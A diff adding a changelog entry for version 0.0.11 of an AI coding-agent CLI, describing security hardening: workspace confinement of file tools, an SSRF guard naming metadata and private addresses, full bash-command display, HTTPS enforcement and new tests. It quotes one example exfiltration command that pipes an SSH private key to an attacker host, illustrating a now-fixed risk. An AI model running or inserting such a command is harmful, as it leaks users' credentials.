@@ -4,6 +4,50 @@ All notable changes to `@axon/cli` are documented here.
 The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/);
 versions follow [SemVer](https://semver.org/).
 
+## 0.0.11 — 2026-06-02 — security & robustness hardening
+
+A full audit of everything shipped so far drove this pass. Headline fix: the
+agent's file tools could read **anything on disk** (your API key, `~/.ssh`,
+`.env`) with no gate — now they're confined to the workspace.
+
+- **Filesystem confinement** (`src/tools/workspace.ts`, new): every built-in file
+  tool now resolves + **canonicalizes** its path (defeating `..` and symlink
+  escapes) and is confined to the workspace root (the git repo containing cwd,
+  else cwd). Reads inside the repo stay silent; a read that escapes the root now
+  **prompts** for permission (new `read_outside` gate) and a non-TTY run denies.
+  `write_file`/`edit_file` flag out-of-root targets as `⚠ OUTSIDE WORKSPACE`;
+  `glob`/`grep` drop matches outside the root (a `../../**` pattern can't leak).
+- **web_fetch SSRF guard** (`src/tools/webfetch.ts`): the host is DNS-resolved
+  and rejected if it maps to a loopback / link-local / private / ULA / CGNAT /
+  metadata address (`169.254.169.254`, `127.0.0.1`, `10/8`, …), on the initial
+  URL **and every redirect hop**. URLs with embedded `user:pass@` credentials are
+  refused, the approval summary no longer prints userinfo, and the allow-key is a
+  normalized host. `AXON_ALLOW_LOCAL_FETCH=1` overrides for local dev.
+- **bash approval shows the FULL command** (`src/tools/bash.ts`): the old 200-char
+  cap could hide a malicious tail (`npm test && curl evil?d=$(cat ~/.ssh/id_rsa)`)
+  from the prompt.
+- **HTTPS enforced** (`src/http.ts` `assertSecureBase`): the bearer key / device
+  code can no longer be sent to a plaintext backend (http:// allowed only for
+  localhost or under `AXON_ALLOW_INSECURE=1`). Checked on every request and at
+  `config set apiBase` / `login --base`.
+- **Atomic config write** (`src/config.ts`): replaced a non-atomic
+  unlink-then-rewrite (a crash could lose the whole config) with a single
+  `rename()`; added a POSIX group/other-writable dir guard (matching the
+  long-standing doc comment).
+- **Resource guards**: SSE reassembly buffer capped at 1 MB (a backend that never
+  sends an event boundary can't OOM us); per-call tool-argument accumulation
+  capped at 256 KB; `read_file`/`edit_file` refuse files over 10 MB whole.
+- **edit_file ambiguity guard** (`src/diff.ts`): a search block that matches more
+  than one location is now rejected instead of silently editing the first hit.
+- **Privacy/UX**: telemetry sends only the file *basename*, never the project
+  path; `axon login --key …` now shows the telemetry notice; the REPL flags when
+  a `CLAUDE.md` is being trusted for compatibility.
+- **Tests + CI**: new suites for confinement, SSRF, atomic config, the SSE caps,
+  diff ambiguity, and HTTPS enforcement (57 tests). Added `.github/workflows/ci.yml`
+  (ubuntu+windows × node 22/24) with a **stale-dist guard** so committed
+  `dist/index.js` can't drift from `src/`. Bumped the engine floor to node ≥22
+  (the file tools use `fs.glob`).
+
 ## 0.0.10 — 2026-05-31 — tighter permission keys + repo-confined memory walk
 
 Follow-up hardening for two residuals flagged in the M3 test report.
